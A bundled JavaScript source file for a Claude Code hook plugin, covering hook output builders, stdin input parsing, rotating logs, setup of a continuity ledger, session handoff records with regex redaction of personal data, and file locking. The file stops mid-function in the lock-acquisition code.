import * as fs6 from 'fs';
import { readSync, readFileSync, writeFileSync } from 'fs';
import * as path2 from 'path';
import { join } from 'path';
import * as crypto from 'crypto';
import * as os from 'os';
import { tmpdir } from 'os';
import { execSync, execFileSync } from 'child_process';

// src/lib/output.ts
function outputSilentSuccess() {
  return {
    continue: true,
    suppressOutput: true
  };
}
function outputSuccess(message) {
  return {
    continue: true,
    systemMessage: message
  };
}
function outputWarning(message) {
  return {
    continue: true,
    systemMessage: `\u26A0 ${message}`
  };
}
function outputDeny(reason, hookEventName = "PreToolUse") {
  return {
    continue: false,
    stopReason: reason,
    hookSpecificOutput: {
      hookEventName,
      permissionDecision: "deny",
      permissionDecisionReason: reason
    }
  };
}
function outputAllow(hookEventName = "PreToolUse") {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName,
      permissionDecision: "allow"
    }
  };
}
function outputAllowWithContext(context, hookEventName = "PreToolUse") {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName,
      permissionDecision: "allow",
      additionalContext: context
    }
  };
}
function outputPromptContext(context) {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName: "UserPromptSubmit",
      additionalContext: context
    }
  };
}
function outputStopContext(context, hookEventName = "Stop") {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName,
      additionalContext: context
    }
  };
}
function outputWithContext(context) {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName: "PostToolUse",
      additionalContext: context
    }
  };
}
function outputAsk(updatedInput, hookEventName = "PreToolUse") {
  const result = {
    continue: true,
    hookSpecificOutput: {
      hookEventName,
      permissionDecision: "ask",
      ...updatedInput !== void 0 && { updatedInput }
    }
  };
  return result;
}
function outputStderrWarning(message) {
  process.stderr.write(`${message}
`);
  process.exit(2);
}
function outputWithNotification(userMsg, claudeCtx, hookEventName = "PostToolUse") {
  return {
    continue: true,
    systemMessage: userMsg,
    hookSpecificOutput: {
      hookEventName,
      additionalContext: claudeCtx
    }
  };
}
function outputRetry() {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName: "PermissionRequest",
      retry: true
    }
  };
}
function outputSessionTitle(title) {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName: "UserPromptSubmit",
      sessionTitle: title
    }
  };
}
function outputMessageDisplay(transformedText) {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName: "MessageDisplay",
      transformedMessage: transformedText
    }
  };
}
function outputAnswerQuestion(updatedInput) {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "allow",
      updatedInput
    }
  };
}
function outputDefer() {
  return {
    continue: true,
    suppressOutput: true,
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "defer"
    }
  };
}
function truncateForLLM(text, options = {}) {
  const { maxChars = 500, maxLines = 20, strategy = "tail" } = options;
  let result = text;
  const lines = result.split("\n");
  if (lines.length > maxLines) {
    switch (strategy) {
      case "head": {
        result = lines.slice(0, maxLines).join("\n");
        const omittedLines = lines.length - maxLines;
        result += `
... (truncated, ${omittedLines} more lines)`;
        break;
      }
      case "tail": {
        const omittedLines = lines.length - maxLines;
        result = `(truncated, ${omittedLines} lines omitted) ...
${lines.slice(-maxLines).join("\n")}`;
        break;
      }
      case "middle": {
        const headCount = 3;
        const tailCount = maxLines - headCount;
        const omittedLines = lines.length - maxLines;
        const headPart = lines.slice(0, headCount).join("\n");
        const tailPart = lines.slice(-tailCount).join("\n");
        result = `${headPart}
... (${omittedLines} lines omitted)
${tailPart}`;
        break;
      }
    }
  }
  if (result.length > maxChars) {
    switch (strategy) {
      case "head": {
        const omittedChars = result.length - maxChars;
        result = `${result.slice(0, maxChars)}... (truncated, ${omittedChars} more chars)`;
        break;
      }
      case "tail": {
        const omittedChars = result.length - maxChars;
        result = `(truncated, ${omittedChars} chars omitted) ...${result.slice(-maxChars)}`;
        break;
      }
      case "middle": {
        const headChars = Math.floor(maxChars / 2);
        const tailChars = maxChars - headChars;
        const omittedChars = result.length - maxChars;
        result = `${result.slice(0, headChars)}... (${omittedChars} chars omitted) ...${result.slice(-tailChars)}`;
        break;
      }
    }
  }
  return result;
}
var MAX_EAGAIN_RETRIES = 50;
function sleepSyncMs(ms) {
  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
}
function readStdinSync() {
  try {
    const chunks = [];
    const BUFSIZE = 256;
    const buf = Buffer.allocUnsafe(BUFSIZE);
    const fd = 0;
    let eagainRetries = 0;
    while (true) {
      try {
        const bytesRead = readSync(fd, buf, 0, BUFSIZE, null);
        if (bytesRead === 0) break;
        chunks.push(Buffer.from(buf.subarray(0, bytesRead)));
        eagainRetries = 0;
      } catch (err) {
        const code = err?.code;
        if ((code === "EAGAIN" || code === "EWOULDBLOCK") && eagainRetries < MAX_EAGAIN_RETRIES) {
          eagainRetries++;
          sleepSyncMs(1);
          continue;
        }
        break;
      }
    }
    return Buffer.concat(chunks).toString("utf8").trim();
  } catch {
    return "";
  }
}
function safeJsonParse(jsonString) {
  if (!jsonString || typeof jsonString !== "string") {
    return null;
  }
  const trimmed = jsonString.trim();
  if (!trimmed) {
    return null;
  }
  try {
    return JSON.parse(trimmed);
  } catch {
    return null;
  }
}
function getDefaultSessionId() {
  return process.env["CLAUDE_CODE_SESSION_ID"] || process.env["CLAUDE_SESSION_ID"] || "unknown";
}
function createDefaultInput() {
  return {
    tool_name: "",
    session_id: getDefaultSessionId(),
    tool_input: {}
  };
}
function normalizeInput(raw) {
  if (!raw || typeof raw !== "object") {
    return createDefaultInput();
  }
  const obj = raw;
  const eventName = obj["tool_name"] || obj["hook_event_name"] || "";
  let toolInput = obj["tool_input"];
  if (toolInput === void 0 || toolInput === null) {
    toolInput = {};
  } else if (typeof toolInput !== "object") {
    toolInput = {};
  }
  const sessionId = typeof obj["session_id"] === "string" && obj["session_id"] ? obj["session_id"] : getDefaultSessionId();
  const normalized = {
    tool_name: eventName,
    session_id: sessionId,
    tool_input: toolInput
  };
  if (obj["hook_event_name"]) {
    normalized["hook_event_name"] = obj["hook_event_name"];
  }
  const passThrough = [
    "source",
    "model",
    "agent_type",
    "agent_id",
    "worktree_path",
    "worktree_branch",
    "cwd",
    "transcript_path",
    "permission_mode",
    "prompt",
    "tool_use_id",
    "last_assistant_message",
    "duration_ms"
  ];
  for (const field of passThrough) {
    if (obj[field] !== void 0) {
      normalized[field] = obj[field];
    }
  }
  return normalized;
}
function isUsableInput(input) {
  if (typeof input.tool_name !== "string") {
    return false;
  }
  if (!input.tool_input || typeof input.tool_input !== "object") {
    return false;
  }
  return true;
}
function readHookInput() {
  const rawInput = readStdinSync();
  if (!rawInput) {
    return createDefaultInput();
  }
  const parsed = safeJsonParse(rawInput);
  if (!parsed) {
    return createDefaultInput();
  }
  const normalized = normalizeInput(parsed);
  if (!isUsableInput(normalized)) {
    return createDefaultInput();
  }
  return normalized;
}
async function readHookInputAsync() {
  return readHookInput();
}
function parseHookInput(jsonString) {
  const parsed = safeJsonParse(jsonString);
  if (!parsed) {
    return createDefaultInput();
  }
  const normalized = normalizeInput(parsed);
  if (!isUsableInput(normalized)) {
    return createDefaultInput();
  }
  return normalized;
}
function getToolName(input) {
  return input.tool_name;
}
function getFilePath(input) {
  const toolInput = input.tool_input;
  if (typeof toolInput.file_path === "string" && toolInput.file_path) {
    return toolInput.file_path;
  }
  if (typeof toolInput.path === "string" && toolInput.path) {
    return toolInput.path;
  }
  return void 0;
}
function getCommand(input) {
  const toolInput = input.tool_input;
  if (typeof toolInput.command === "string") {
    return toolInput.command;
  }
  return void 0;
}
function stripProxyPrefix(command) {
  return command.replace(/^rtk\s+/, "");
}
function getSessionId(input) {
  if (typeof input.session_id === "string" && input.session_id) {
    return input.session_id;
  }
  const envSessionId = process.env["CLAUDE_CODE_SESSION_ID"] || process.env["CLAUDE_SESSION_ID"];
  if (envSessionId) {
    return envSessionId;
  }
  return "unknown";
}
function getAgentId(input) {
  return input.agent_id;
}
function getAgentType(input) {
  return input.agent_type;
}
function getWorktreePath(input) {
  return input.worktree_path;
}
function getWorktreeBranch(input) {
  return input.worktree_branch;
}
function getDurationMs(input) {
  return input.duration_ms;
}
function getProjectDir() {
  return process.env["CLAUDE_PROJECT_DIR"] || process.cwd();
}
function getContent(input) {
  const toolInput = input.tool_input;
  if (typeof toolInput.content === "string") {
    return toolInput.content;
  }
  return void 0;
}
function getPattern(input) {
  const toolInput = input.tool_input;
  if (typeof toolInput.pattern === "string") {
    return toolInput.pattern;
  }
  return void 0;
}
function getOldString(input) {
  const toolInput = input.tool_input;
  if (typeof toolInput.old_string === "string") {
    return toolInput.old_string;
  }
  return void 0;
}
function getNewString(input) {
  const toolInput = input.tool_input;
  if (typeof toolInput.new_string === "string") {
    return toolInput.new_string;
  }
  return void 0;
}
function getField(input, field) {
  const toolInput = input.tool_input;
  const value = toolInput[field];
  return value;
}
function getToolInput(input) {
  return input.tool_input;
}
function getProviderInfo() {
  const defaultSonnetModel = process.env["ANTHROPIC_DEFAULT_SONNET_MODEL"] || null;
  const defaultOpusModel = process.env["ANTHROPIC_DEFAULT_OPUS_MODEL"] || null;
  const defaultHaikuModel = process.env["ANTHROPIC_DEFAULT_HAIKU_MODEL"] || null;
  const model = process.env["ANTHROPIC_MODEL"] || null;
  if (process.env["CLAUDE_CODE_USE_BEDROCK"] === "1") {
    return { provider: "bedrock", model, defaultSonnetModel, defaultOpusModel, defaultHaikuModel };
  }
  if (process.env["CLAUDE_CODE_USE_VERTEX"] === "1") {
    return { provider: "vertex", model, defaultSonnetModel, defaultOpusModel, defaultHaikuModel };
  }
  if (process.env["CLAUDE_CODE_USE_AZURE"] === "1") {
    return { provider: "foundry", model, defaultSonnetModel, defaultOpusModel, defaultHaikuModel };
  }
  return {
    provider: "anthropic",
    model: null,
    defaultSonnetModel,
    defaultOpusModel,
    defaultHaikuModel
  };
}
var PLUGIN_NAME = process.env["CLAUDE_PLUGIN_NAME"] || "plugin";
function computeLogDir() {
  const pluginDataDir = process.env["CLAUDE_PLUGIN_DATA"];
  return pluginDataDir ? path2.join(pluginDataDir, "logs") : path2.join(process.env["HOME"] || "/tmp", ".claude", "logs", PLUGIN_NAME);
}
var cachedLogDir = null;
function resolveLogDir() {
  if (cachedLogDir === null) {
    cachedLogDir = computeLogDir();
  }
  return cachedLogDir;
}
function resolveHookLogFile() {
  return path2.join(resolveLogDir(), "hooks.log");
}
function resolvePermissionLogFile() {
  return path2.join(resolveLogDir(), "permission-feedback.log");
}
var HOOK_LOG_MAX_SIZE = 204800;
var PERMISSION_LOG_MAX_SIZE = 102400;
var LOG_LEVEL_VALUES = {
  debug: 0,
  info: 1,
  warn: 2,
  error: 3
};
var currentLogLevel = null;
var logDirCreated = false;
function getLogLevel() {
  if (currentLogLevel !== null) {
    return currentLogLevel;
  }
  const envVarName = `${PLUGIN_NAME.toUpperCase()}_LOG_LEVEL`;
  const envLevel = process.env[envVarName]?.toLowerCase();
  if (envLevel && envLevel in LOG_LEVEL_VALUES) {
    currentLogLevel = envLevel;
  } else {
    currentLogLevel = "warn";
  }
  return currentLogLevel;
}
function shouldLog(level) {
  const currentLevelNum = LOG_LEVEL_VALUES[getLogLevel()];
  const requestedLevelNum = LOG_LEVEL_VALUES[level];
  return requestedLevelNum >= currentLevelNum;
}
function ensureLogDir() {
  if (logDirCreated) {
    return;
  }
  try {
    const logDir = resolveLogDir();
    if (!fs6.existsSync(logDir)) {
      fs6.mkdirSync(logDir, { recursive: true });
    }
    logDirCreated = true;
  } catch {
  }
}
function getFileSize(filePath) {
  try {
    const stats = fs6.statSync(filePath);
    return stats.size;
  } catch {
    return 0;
  }
}
function rotateLog(logFile, maxSize) {
  try {
    const size = getFileSize(logFile);
    if (size > maxSize) {
      const timestamp = (/* @__PURE__ */ new Date()).toISOString().replace(/[:.]/g, "-").slice(0, 19);
      const rotatedFile = `${logFile}.old.${timestamp}`;
      fs6.renameSync(logFile, rotatedFile);
    }
  } catch {
  }
}
function getTimestamp() {
  return (/* @__PURE__ */ new Date()).toISOString();
}
function writeLogLine(logFile, line) {
  try {
    fs6.appendFileSync(logFile, `${line}
`, { encoding: "utf8" });
  } catch {
  }
}
function logDebug(hookName, message) {
  if (!shouldLog("debug")) {
    return;
  }
  ensureLogDir();
  rotateLog(resolveHookLogFile(), HOOK_LOG_MAX_SIZE);
  const timestamp = getTimestamp();
  const line = `${timestamp} [DEBUG] [${hookName}] ${message}`;
  writeLogLine(resolveHookLogFile(), line);
}
function logInfo(hookName, message) {
  if (!shouldLog("info")) {
    return;
  }
  ensureLogDir();
  rotateLog(resolveHookLogFile(), HOOK_LOG_MAX_SIZE);
  const timestamp = getTimestamp();
  const line = `${timestamp} [INFO] [${hookName}] ${message}`;
  writeLogLine(resolveHookLogFile(), line);
}
function logWarn(hookName, message) {
  if (!shouldLog("warn")) {
    return;
  }
  ensureLogDir();
  rotateLog(resolveHookLogFile(), HOOK_LOG_MAX_SIZE);
  const timestamp = getTimestamp();
  const line = `${timestamp} [WARN] [${hookName}] ${message}`;
  writeLogLine(resolveHookLogFile(), line);
}
function logError(hookName, message) {
  if (!shouldLog("error")) {
    return;
  }
  ensureLogDir();
  rotateLog(resolveHookLogFile(), HOOK_LOG_MAX_SIZE);
  const timestamp = getTimestamp();
  const line = `${timestamp} [ERROR] [${hookName}] ${message}`;
  writeLogLine(resolveHookLogFile(), line);
}
function logPermission(decision, reason, tool, sessionId, agentContext) {
  ensureLogDir();
  rotateLog(resolvePermissionLogFile(), PERMISSION_LOG_MAX_SIZE);
  const timestamp = getTimestamp();
  const session = sessionId || process.env["CLAUDE_CODE_SESSION_ID"] || process.env["CLAUDE_SESSION_ID"] || "unknown";
  const sanitize = (s) => s.replace(/[\n\r]/g, " ").replace(/"/g, '\\"');
  const escapedReason = sanitize(reason);
  let line = `${timestamp} [PERMISSION] decision=${decision} tool=${tool} session=${session}`;
  if (agentContext?.agentId) {
    line += ` agent_id=${sanitize(agentContext.agentId)}`;
  }
  if (agentContext?.agentType) {
    line += ` agent_type=${sanitize(agentContext.agentType)}`;
  }
  line += ` reason="${escapedReason}"`;
  writeLogLine(resolvePermissionLogFile(), line);
}
function logPermissionEntry(entry) {
  const decision = entry.decision === "warn" ? "allow" : entry.decision;
  logPermission(decision, entry.reason, entry.tool, entry.sessionId);
}
function createLogger(_defaultHookName) {
  return {
    debug: (hookName, message) => logDebug(hookName, message),
    info: (hookName, message) => logInfo(hookName, message),
    warn: (hookName, message) => logWarn(hookName, message),
    error: (hookName, message) => logError(hookName, message),
    permission: (entry) => logPermissionEntry(entry)
  };
}
function createScopedLogger(hookName) {
  return {
    debug: (message) => logDebug(hookName, message),
    info: (message) => logInfo(hookName, message),
    warn: (message) => logWarn(hookName, message),
    error: (message) => logError(hookName, message),
    permission: (decision, reason, tool, sessionId) => logPermission(decision, reason, tool, sessionId)
  };
}
function resetLogLevel() {
  currentLogLevel = null;
}
function getCurrentLogLevel() {
  return getLogLevel();
}
function getHookLogPath() {
  return resolveHookLogFile();
}
function getPermissionLogPath() {
  return resolvePermissionLogFile();
}
function getLogDir() {
  return resolveLogDir();
}

// src/types.ts
function isBashToolInput(input) {
  return typeof input.command === "string";
}
function isFileToolInput(input) {
  return typeof input.file_path === "string";
}
function isUserPromptInput(input) {
  return typeof input === "object" && input !== null && "prompt" in input && typeof input.prompt === "string";
}
function getHookEnvironment() {
  const pluginName = process.env["CLAUDE_PLUGIN_NAME"] || "plugin";
  const envVar = `${pluginName.toUpperCase()}_LOG_LEVEL`;
  return {
    projectDir: process.env["CLAUDE_PROJECT_DIR"] || process.cwd(),
    pluginRoot: process.env["CLAUDE_PLUGIN_ROOT"] || "",
    sessionId: process.env["CLAUDE_CODE_SESSION_ID"] || process.env["CLAUDE_SESSION_ID"] || "unknown",
    logLevel: process.env[envVar] || "warn"
  };
}
var CONTINUITY_DIRS = {
  base: ".claude/continuity",
  ledgers: ".claude/continuity/ledgers",
  handoffs: ".claude/continuity/handoffs",
  archive: ".claude/continuity/archive",
  learnings: ".claude/continuity/learnings",
  context: ".claude/context"
};
function ensureDirectory(dirPath) {
  if (!fs6.existsSync(dirPath)) {
    try {
      fs6.mkdirSync(dirPath, { recursive: true });
      return true;
    } catch {
      return false;
    }
  }
  return true;
}
function formatTimestamp() {
  return (/* @__PURE__ */ new Date()).toISOString().replace(/\.\d{3}Z$/, "Z");
}
function createDefaultSharedContext(projectDir, projectName) {
  const contextFile = path2.join(projectDir, CONTINUITY_DIRS.context, "shared-context.json");
  const timestamp = formatTimestamp();
  const defaultContext = {
    version: "1.0.0",
    timestamp,
    session_id: null,
    mode: "adaptive",
    agent_decisions: {},
    tasks_completed: [],
    tasks_pending: [],
    codebase_patterns: {
      component_style: "functional",
      state_management: "hooks",
      testing_framework: "vitest"
    },
    architectural_decisions: {},
    retention: {
      current_session: null,
      active_since: null,
      archive_after_days: 30,
      summarize_after_days: 90,
      previous_sessions: []
    },
    continuity: {
      current_ledger: `.claude/continuity/ledgers/CONTINUITY_${projectName}.md`,
      last_handoff: null,
      last_cleanup: null,
      session_start: null,
      learnings_file: ".claude/continuity/learnings/extracted-patterns.md",
      last_suggestion: {
        timestamp: null,
        command: null,
        reason: null
      }
    },
    last_activity: null,
    active_agent: null,
    dirty_tracking: {
      files_edited_count: 0,
      last_edit_timestamp: null,
      files_edited_this_session: [],
      threshold_warning: 15,
      threshold_auto_suggest: 25
    },
    session_heartbeat: {
      last_activity: null,
      session_start: null,
      was_cleanly_ended: true
    }
  };
  fs6.writeFileSync(contextFile, `${JSON.stringify(defaultContext, null, 2)}
`);
}
function createDefaultLedger(ledgerPath, projectName) {
  const timestamp = formatTimestamp();
  const dateStr = timestamp.slice(0, 10);
  const ledgerContent = `# Project Ledger: ${projectName}

> Last updated: ${timestamp}
> Session: Initial Setup
> Model: Append-Until-Handoff (v2.0)

## Current State

### Now
- **Branch**: \`main\`
- **Focus**: Project initialized with continuity system
- **Status**: Ready for development

### Done (Recent)
1. Initialized continuity system structure

### Next
- Begin development work
- Use \`/save-state\` to capture progress
- Use \`/create-handoff\` when ending sessions

## Session Activity Log

### ${dateStr} - Initial Setup
- Continuity system initialized
- Default ledger created

## Key Decisions

_No decisions recorded yet. Use this section to document architectural and design decisions._

## Open Questions

### Blocking
_None_

### Non-blocking
_None_

## Context

### Active Branch
- **Name**: \`main\`
- **Purpose**: Main development branch

---
*Created: ${timestamp}*
*Updated: ${timestamp}*
`;
  fs6.writeFileSync(ledgerPath, ledgerContent);
}
function createContinuityDirectories(projectDir) {
  let createdAny = false;
  const claudeDir = path2.join(projectDir, ".claude");
  if (!fs6.existsSync(claudeDir)) {
    if (!ensureDirectory(claudeDir)) {
      throw new Error("Failed to create .claude directory");
    }
    createdAny = true;
  }
  const directories = [
    CONTINUITY_DIRS.base,
    CONTINUITY_DIRS.ledgers,
    CONTINUITY_DIRS.handoffs,
    CONTINUITY_DIRS.archive,
    CONTINUITY_DIRS.learnings,
    CONTINUITY_DIRS.context
  ];
  for (const dir of directories) {
    const dirPath = path2.join(projectDir, dir);
    if (!fs6.existsSync(dirPath)) {
      if (!ensureDirectory(dirPath)) {
        throw new Error(`Failed to create directory: ${dir}`);
      }
      createdAny = true;
    }
  }
  return createdAny;
}
function createGitkeepFiles(projectDir) {
  const gitkeepDirs = [
    CONTINUITY_DIRS.ledgers,
    CONTINUITY_DIRS.handoffs,
    CONTINUITY_DIRS.archive,
    CONTINUITY_DIRS.learnings
  ];
  for (const dir of gitkeepDirs) {
    const gitkeepPath = path2.join(projectDir, dir, ".gitkeep");
    if (!fs6.existsSync(gitkeepPath)) {
      try {
        fs6.writeFileSync(gitkeepPath, "");
      } catch {
      }
    }
  }
}
function createLedgerIfNeeded(projectDir, projectName) {
  const ledgersDir = path2.join(projectDir, CONTINUITY_DIRS.ledgers);
  const defaultLedger = path2.join(ledgersDir, `CONTINUITY_${projectName}.md`);
  if (fs6.existsSync(defaultLedger)) {
    return false;
  }
  const files = fs6.readdirSync(ledgersDir);
  const hasLedger = files.some((f) => f.endsWith(".md") && f !== ".gitkeep");
  if (!hasLedger) {
    createDefaultLedger(defaultLedger, projectName);
    return true;
  }
  return false;
}
function ensureContinuityStructure(projectDir) {
  const projectName = path2.basename(projectDir);
  let createdAny = false;
  try {
    if (createContinuityDirectories(projectDir)) {
      createdAny = true;
    }
    createGitkeepFiles(projectDir);
    const contextFile = path2.join(projectDir, CONTINUITY_DIRS.context, "shared-context.json");
    if (!fs6.existsSync(contextFile)) {
      createDefaultSharedContext(projectDir, projectName);
      createdAny = true;
    }
    if (createLedgerIfNeeded(projectDir, projectName)) {
      createdAny = true;
    }
    return createdAny ? "created" : "existed";
  } catch {
    return "error";
  }
}
function getCurrentLedgerPath(projectDir) {
  const ledgersDir = path2.join(projectDir, CONTINUITY_DIRS.ledgers);
  if (!fs6.existsSync(ledgersDir)) {
    return null;
  }
  try {
    const files = fs6.readdirSync(ledgersDir);
    const ledgerFile = files.find((f) => f.endsWith(".md") && f !== ".gitkeep");
    if (ledgerFile) {
      return path2.join(ledgersDir, ledgerFile);
    }
  } catch {
  }
  return null;
}
function detectSectionType(trimmed, exitedCurrentState) {
  if (trimmed.startsWith("## ") && !trimmed.startsWith("## Current State")) {
    return "exitCurrentState";
  }
  if (exitedCurrentState) {
    return null;
  }
  if (trimmed.startsWith("### Now")) {
    return "now";
  }
  if (trimmed.startsWith("### Done (Recent)") || trimmed.startsWith("### Done(Recent)")) {
    return "doneRecent";
  }
  if (trimmed.startsWith("### Next")) {
    return "next";
  }
  if (trimmed.startsWith("###")) {
    return "otherSubsection";
  }
  return null;
}
function updateParserStateForSection(state, sectionType) {
  switch (sectionType) {
    case "exitCurrentState":
      state.exitedCurrentState = true;
      state.inNow = false;
      state.inDoneRecent = false;
      state.inNext = false;
      break;
    case "now":
      state.inNow = true;
      state.inDoneRecent = false;
      state.inNext = false;
      break;
    case "doneRecent":
      state.inNow = false;
      state.inDoneRecent = true;
      state.inNext = false;
      break;
    case "next":
      state.inNow = false;
      state.inDoneRecent = false;
      state.inNext = true;
      break;
    case "otherSubsection":
      state.inNow = false;
      state.inDoneRecent = false;
      state.inNext = false;
      break;
  }
}
function cleanStatusLine(line) {
  let cleaned = line.replace(/^- /, "");
  cleaned = cleaned.replace(/\*\*([^*]+)\*\*/g, "$1");
  return cleaned;
}
function extractContentFromLine(state, trimmed) {
  if (trimmed.length === 0) {
    return;
  }
  if (state.inNow && !state.status) {
    state.status = cleanStatusLine(trimmed);
    return;
  }
  if (state.inDoneRecent) {
    const numberedMatch = trimmed.match(/^\d+\.\s*(.+)/);
    if (numberedMatch?.[1]) {
      state.recent = numberedMatch[1];
    }
    return;
  }
  if (state.inNext && !state.next) {
    const bulletMatch = trimmed.match(/^[-*]\s*(.+)/);
    if (bulletMatch?.[1]) {
      state.next = bulletMatch[1];
    }
  }
}
function extractLedgerSummary(content) {
  if (!content || content.trim().length === 0) {
    return null;
  }
  const state = {
    status: "",
    recent: "",
    next: "",
    inNow: false,
    inDoneRecent: false,
    inNext: false,
    exitedCurrentState: false
  };
  for (const line of content.split("\n")) {
    const trimmed = line.trim();
    const sectionType = detectSectionType(trimmed, state.exitedCurrentState);
    if (sectionType) {
      updateParserStateForSection(state, sectionType);
      continue;
    }
    if (state.exitedCurrentState) {
      continue;
    }
    extractContentFromLine(state, trimmed);
  }
  if (!state.status && !state.recent && !state.next) {
    return null;
  }
  return { status: state.status, recent: state.recent, next: state.next };
}

// src/lib/handoff-schema.ts
var HOOK_NAME = "handoff-schema";
var HANDOFF_SCHEMA_VERSION = 1;
var PHI_PATTERNS = [
  { regex: /\b[\w.+-]+@[\w-]+\.[\w.-]+\b/g, label: "EMAIL" },
  { regex: /\b\d{3}-\d{2}-\d{4}\b/g, label: "SSN" },
  { regex: /\b\(?\d{3}\)?[-.\s]\d{3}[-.\s]\d{4}\b/g, label: "PHONE" },
  { regex: /\bMBR[-_]?\d{4,}\b/gi, label: "MEMBER-ID" },
  { regex: /\bmember[-_]?id[=:]\s*\S+/gi, label: "MEMBER-ID" },
  { regex: /\bpatient[-_]?id[=:]\s*\S+/gi, label: "PATIENT-ID" },
  // 16-digit credit-card-shaped sequences (skip 7-15 to avoid false positives on git hashes etc.)
  { regex: /\b\d{16}\b/g, label: "CARD" }
];
function scrubPHIFromString(value) {
  let scrubbed = value;
  let redacted = false;
  for (const { regex, label } of PHI_PATTERNS) {
    if (regex.test(scrubbed)) {
      redacted = true;
      regex.lastIndex = 0;
      scrubbed = scrubbed.replace(regex, `[REDACTED-${label}]`);
    }
  }
  return { value: scrubbed, redacted };
}
function scrubPHI(handoff) {
  let anyRedacted = false;
  const scrubArr = (arr) => arr.map((s) => {
    const r = scrubPHIFromString(s);
    if (r.redacted) anyRedacted = true;
    return r.value;
  });
  const scrubMaybe = (s) => {
    if (s === null) return null;
    const r = scrubPHIFromString(s);
    if (r.redacted) anyRedacted = true;
    return r.value;
  };
  const open_mrs = handoff.open_mrs.map((mr) => {
    const title = mr.title ? scrubPHIFromString(mr.title) : void 0;
    const status = mr.status ? scrubPHIFromString(mr.status) : void 0;
    if (title?.redacted || status?.redacted) anyRedacted = true;
    return {
      id: mr.id,
      ...title !== void 0 && { title: title.value },
      ...status !== void 0 && { status: status.value }
    };
  });
  const worktreeScrub = scrubPHIFromString(handoff.worktree);
  if (worktreeScrub.redacted) anyRedacted = true;
  const result = {
    schema_version: handoff.schema_version,
    session_id: scrubMaybe(handoff.session_id),
    timestamp: handoff.timestamp,
    branch: scrubMaybe(handoff.branch),
    worktree: worktreeScrub.value,
    dirty_files: scrubArr(handoff.dirty_files),
    open_mrs,
    next_steps: scrubArr(handoff.next_steps),
    blockers: scrubArr(handoff.blockers),
    compaction_trigger: handoff.compaction_trigger,
    phi_redacted: anyRedacted || handoff.phi_redacted
  };
  if (anyRedacted) {
    logWarn(HOOK_NAME, "PHI patterns detected in handoff content and redacted before write");
  }
  return result;
}
function buildHandoff(input) {
  const raw = {
    schema_version: HANDOFF_SCHEMA_VERSION,
    session_id: input.session_id ?? null,
    timestamp: input.timestamp ?? (/* @__PURE__ */ new Date()).toISOString().replace(/\.\d{3}Z$/, "Z"),
    branch: input.branch ?? null,
    worktree: input.worktree,
    dirty_files: input.dirty_files ?? [],
    open_mrs: input.open_mrs ?? [],
    next_steps: input.next_steps ?? [],
    blockers: input.blockers ?? [],
    compaction_trigger: input.compaction_trigger,
    phi_redacted: false
  };
  return scrubPHI(raw);
}
function validateHandoff(value) {
  if (typeof value !== "object" || value === null) return null;
  const v = value;
  if (typeof v.schema_version !== "number") return null;
  if (v.schema_version > HANDOFF_SCHEMA_VERSION) return null;
  if (typeof v.timestamp !== "string") return null;
  if (typeof v.worktree !== "string") return null;
  if (!Array.isArray(v.dirty_files)) return null;
  if (!Array.isArray(v.open_mrs)) return null;
  if (!Array.isArray(v.next_steps)) return null;
  if (!Array.isArray(v.blockers)) return null;
  if (typeof v.compaction_trigger !== "string") return null;
  if (typeof v.phi_redacted !== "boolean") return null;
  return v;
}
function formatHandoffSummary(handoff) {
  const lines = ["Last session handoff:"];
  lines.push(`  saved: ${handoff.timestamp} (${handoff.compaction_trigger})`);
  if (handoff.branch) lines.push(`  branch: ${handoff.branch}`);
  if (handoff.dirty_files.length > 0) {
    lines.push(`  dirty: ${handoff.dirty_files.length} file(s)`);
  }
  if (handoff.open_mrs.length > 0) {
    lines.push(`  open MRs: ${handoff.open_mrs.map((m) => m.id).join(", ")}`);
  }
  if (handoff.next_steps.length > 0) {
    lines.push("  next steps:");
    for (const step of handoff.next_steps.slice(0, 3)) {
      lines.push(`    - ${step}`);
    }
  }
  if (handoff.blockers.length > 0) {
    lines.push("  blockers:");
    for (const b of handoff.blockers.slice(0, 3)) {
      lines.push(`    - ${b}`);
    }
  }
  if (handoff.phi_redacted) {
    lines.push("  note: PHI patterns redacted at write \u2014 verify intended content.");
  }
  return lines.join("\n");
}
var LOCK_RETRY_DELAY_MS = 100;
function sleep(ms) {
  return new Promise((resolve7) => setTimeout(resolve7, ms));
}
function isPidAlive(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}
function removeStaleLock(lockPath, expectedMtimeMs) {
  try {
    const stat = fs6.statSync(lockPath);
    if (stat.mtimeMs !== expectedMtimeMs) {
      return false;
    }
    fs6.rmSync(lockPath, { recursive: true, force: true });
    return true;
  } catch {
    return true;
  }
}
function clearStaleLockIfNeeded(lockPath, maxAge) {
  let stat;
  try {
    stat = fs6.statSync(lockPath);
  } catch {
    return true;
  }
  const lockAgeMs = Date.now() - stat.mtimeMs;
  if (lockAgeMs <= maxAge) {
    return false;
  }
  let pid = null;
  try {
    const pidStr = fs6.readFileSync(path2.join(lockPath, "pid"), "utf-8").trim();
    const parsed = Number.parseInt(pidStr, 10);
    if (!Number.isNaN(parsed) && parsed > 0) {
      pid = parsed;
    }
  } catch {
  }
  if (pid !== null && isPidAlive(pid)) {
    return false;
  }
  return removeStaleLock(lockPath, stat.mtimeMs);
}
async function acquireLock(lockPath, maxAttempts = 50, maxAge = 1e4) {
  for (let attempt = 0; attempt < maxAttempts; attempt++) {
    try {
      fs6.mkdirSync(lockPath);
    } catch {
      if (clearStaleLockIfNeeded(lockPath, maxAge)) {
        continue;
      }
      await sleep(LOCK_RETRY_DELAY_MS);
      continue;
    }
    try {
      fs6.writeFileSync(path2.join(lockPath, "pid"), String(process.pid), { flag: "wx" });
      return true;
    } catch (err) {
      if (err.code !== "ENOENT") {
